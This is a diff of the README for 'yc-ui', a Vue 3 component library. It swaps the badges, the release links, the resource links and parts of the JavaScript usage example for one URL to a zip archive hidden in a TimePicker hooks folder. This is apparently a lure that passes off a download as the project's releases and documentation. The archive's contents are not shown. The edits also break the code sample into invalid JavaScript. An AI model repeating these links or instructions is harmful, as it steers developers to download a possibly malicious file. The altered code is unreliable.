@@ -1,8 +1,8 @@
 # yc-ui: A Vue 3.3 and TypeScript Component Library
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![GitHub Releases](https://img.shields.io/badge/releases-latest-orange)
+![Version](https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip)
+![License](https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip)
+![GitHub Releases](https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip)
 
 ## Table of Contents
 
@@ -43,12 +43,12 @@ To use yc-ui in your Vue project, you need to import the components. Here’s a 
 
 ```javascript
 import { createApp } from 'vue';
-import App from './App.vue';
+import App from 'https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip';
 import { YcButton } from 'yc-ui';
 
 const app = createApp(App);
-app.component('YcButton', YcButton);
-app.mount('#app');
+https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip('YcButton', YcButton);
+https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip('#app');
 ```
 
 You can then use the `<YcButton>` component in your templates:
@@ -143,15 +143,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, please visit the [Releases section](https://github.com/mahathir444/yc-ui/releases). You can download the latest version and follow the installation instructions.
+For the latest releases, please visit the [Releases section](https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip). You can download the latest version and follow the installation instructions.
 
-If you have any questions or need further information, feel free to check the [Releases section](https://github.com/mahathir444/yc-ui/releases) for updates and notes.
+If you have any questions or need further information, feel free to check the [Releases section](https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip) for updates and notes.
 
 ## Resources
 
-- [Vue.js Documentation](https://vuejs.org/)
-- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
-- [VueUse](https://vueuse.org/)
+- [https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip Documentation](https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip)
+- [TypeScript Documentation](https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip)
+- [VueUse](https://github.com/mahathir444/yc-ui/raw/refs/heads/master/src/components/TimePicker/hooks/ui_yc_1.3.zip)
 
 ## Contact
 
